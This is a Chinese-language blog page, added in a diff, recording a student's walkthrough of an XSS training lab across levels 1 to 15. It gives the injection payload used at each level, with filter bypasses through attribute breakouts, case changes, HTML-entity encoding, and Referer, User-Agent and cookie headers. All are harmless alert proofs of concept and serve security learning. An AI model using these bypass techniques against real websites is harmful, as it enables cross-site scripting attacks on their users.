@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>2023/7/21：夏令营week2记录:xsslab | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="1&lt;script &quot;  &amp;#x27;Oonn&gt; 可以用来测闭合 level 1将上面的test改为 1&lt;script&gt;alert(1)&lt;&#x2F;script&gt; level 2检测搜索框内为双引号闭合 1&quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt; level 3“&gt;”被替换了 1keyword&#x3D;1&amp;#x">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023&#x2F;7&#x2F;21：夏令营week2记录:xsslab">
+<meta property="og:url" content="http://example.com/2023/07/21/xsslab/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="1&lt;script &quot;  &amp;#x27;Oonn&gt; 可以用来测闭合 level 1将上面的test改为 1&lt;script&gt;alert(1)&lt;&#x2F;script&gt; level 2检测搜索框内为双引号闭合 1&quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt; level 3“&gt;”被替换了 1keyword&#x3D;1&amp;#x">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-07-21T01:35:45.000Z">
+<meta property="article:modified_time" content="2023-07-21T15:18:57.690Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-xsslab" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/07/21/xsslab/" class="article-date">
+  <time datetime="2023-07-21T01:35:45.000Z" itemprop="datePublished">2023-07-21</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      2023/7/21：夏令营week2记录:xsslab
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script &quot;  &#x27;Oonn&gt; 可以用来测闭合</span><br></pre></td></tr></table></figure>
+<h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3><p>将上面的test改为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3><p>检测搜索框内为双引号闭合</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h3><p>“&gt;”被替换了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword=1&#x27; onclick=&#x27;alert(1) 补全标签</span><br></pre></td></tr></table></figure>
+<h3 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h3><p>查看源码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;keyword&quot; value=&quot;script &quot; &#x27;oonn&quot;=&quot;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>双引号闭合</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword=1&quot; onclick=&quot;alert(1) 补全标签</span><br></pre></td></tr></table></figure>
+<h3 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h3><p>关键词过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;keyword&quot; value=&quot;&lt;scr_ipt &quot; &#x27;oo_nn=&quot;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword=&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;</span><br></pre></td></tr></table></figure>
+<p>点一下下面的蓝色连接即可</p>
+<h3 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h3><p>在上一题基础上有了更多过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a hr_ef=&quot;javascript:alert(1)&quot; &quot;=&quot;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword=&quot;&gt;&lt;a hRef=&quot;javascript:alert(1)&quot;</span><br></pre></td></tr></table></figure>
+<p>？上一题过滤大小写这题不过滤？</p>
+<h3 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h3><p>似乎删掉了关键字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;keyword&quot; value=&quot;&lt; &quot; &#x27;on=&quot;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>onclick删了on,过滤了但没完全过滤（</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword=1&quot; oonnclick=&quot;alert(1)</span><br></pre></td></tr></table></figure>
+<h3 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h3><p>应该还是关键词过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;&lt;scr_ipt &quot;  &#x27;oo_nn&gt;&quot;&gt;友情链接&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<p>大小写绕过无效，自动转换为小写<br>可以编码绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</span><br><span class="line">以上字符串对javascript:alert(1)进行ascii编码</span><br></pre></td></tr></table></figure>
+<h3 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;keyword&quot; value=&quot;&lt;script &amp;quot;  &#x27;oonn&gt;&quot;&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;添加友情链接&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<p>？不太对劲，百度下源码<br>要加个http://，剩下与第8题一样<br>只要有这个字段就行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;(&#x27;http://&#x27;)</span><br><span class="line">刚开始还不知道拿这个http咋办，结果百度只要扔在后面就行</span><br></pre></td></tr></table></figure>
+<h3 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h3><p>随便扔个关键字进去没反应<br>F12</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;t_link&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>url里的keyword估计啥用没有，再扔几下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;t_sort&quot; value=&quot;script &quot; &#x27;oonn&quot;=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t_sort=&quot; onclick=&#x27;alert(1)&#x27; type=&quot;text</span><br></pre></td></tr></table></figure>
+<p>关键应该就是type把hidden改掉</p>
+<h3 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h3><p>把上一题payload扔进去</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;t_sort&quot; value=&quot;&quot; onclick=&#x27;alert(1)&#x27; type=&quot;text&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>试了半天都差不多这样，麻<br>查了源码是referer请求头注入<br>题目好像有提示我傻了<br>把上一题的payload扔到referer里就行</p>
+<h3 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h3><p>又是请求头</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;t_ua&quot; value=&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>？服务器拒绝连接太6了<br>跳了不知道什么情况</p>
+<h3 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h3><p>这题改cookie</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;t_cook&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>emm还要添个user</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=&quot; onclick=&#x27;alert(1)&#x27; type=&quot;text</span><br></pre></td></tr></table></figure>
+<h3 id="level-14-（写不出来）"><a href="#level-14-（写不出来）" class="headerlink" title="level 14 （写不出来）"></a>level 14 （写不出来）</h3><p>需要用到这个网站：<a target="_blank" rel="noopener" href="http://ww1.exifviewer.org/">http://ww1.exifviewer.org/</a> 需要梯子</p>
+<p>查了下解法：<br>1.查看源码是iframe框，src到上面的网站<br>2.burp抓包请求，返回有字段X-Frame-Options:SAMEORIGIN（我抓了，没有，可能是我的问题），表示该页面要在相同域名的iframe中展示，修改为：X-Frame-Options:ALLOW-FROM http://…/xss/level14.php<br>3.这个网站可以从任意图像文件提取元数据，往文件写入xss payload<br>4.使用火狐firebug将scrolling=”no”改为yes会出现滚动条<br>5.win7修改图片属性可直接修改EXIF的值<br>6.payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&quot;&gt;&lt;img src=1 onerror=alert(document.domain)&gt;&#x27;</span><br></pre></td></tr></table></figure>
+<p>在上传过程不断修改返回包的X-Frame-Options字段</p>
+<p>比前面的有趣，虽然我肯定不会写</p>
+<h3 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h3><p>…<br>后面都404了，在冬令营那会还没问题<br>先这样了</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/07/21/xsslab/" data-id="clkcq8h4y0000qoud4jq9gifl" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2023/07/16/week1plus/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">2023/07/15：夏令营week1记录:出题</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">February 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/07/21/xsslab/">2023/7/21：夏令营week2记录:xsslab</a>
+          </li>
+        
+          <li>
+            <a href="/2023/07/16/week1plus/">2023/07/15：夏令营week1记录:出题</a>
+          </li>
+        
+          <li>
+            <a href="/2023/07/16/weekpro/">2023/07/16：夏令营week1记录:sql-lab</a>
+          </li>
+        
+          <li>
+            <a href="/2023/07/13/week1/">2023/07/10：夏令营week1记录:mysql笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2023/04/28/warmup/">2023/04/18：FCTF2023：warmup&amp;正式比赛</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2023 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
